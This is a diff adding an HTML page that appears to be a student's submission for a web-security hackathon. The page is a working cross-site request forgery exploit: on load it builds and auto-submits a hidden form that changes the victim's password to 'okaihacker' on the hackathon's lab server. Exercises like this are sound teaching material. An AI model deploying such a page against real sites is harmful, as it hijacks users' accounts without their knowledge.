@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>WAPH-Hackathon 4</title>
+</head>
+<body>
+h1>WAPH-Hackthon 4: Cross-site Request Forgery Attack</h1>
+<h2>By Hacker Seth Okai</h2>
+<script>
+function CSRF() {
+    var form = document.createElement('form');
+    form.action = "https://waph-hackathon.eastus.cloudapp.azure.com/csrf/changepassword.php";
+    form.method = 'POST';
+    form.target = '_self';
+    form.innerHTML = "<input type='hidden' name='newpassword' value='okaihacker' />";
+    document.body.appendChild(form);
+    alert('CSRF Attack for Hackathon 4 is about to happen - By Seth Okai');
+    form.submit();
+ }
+
+CSRF();
+</script>
+</body>
+</html>
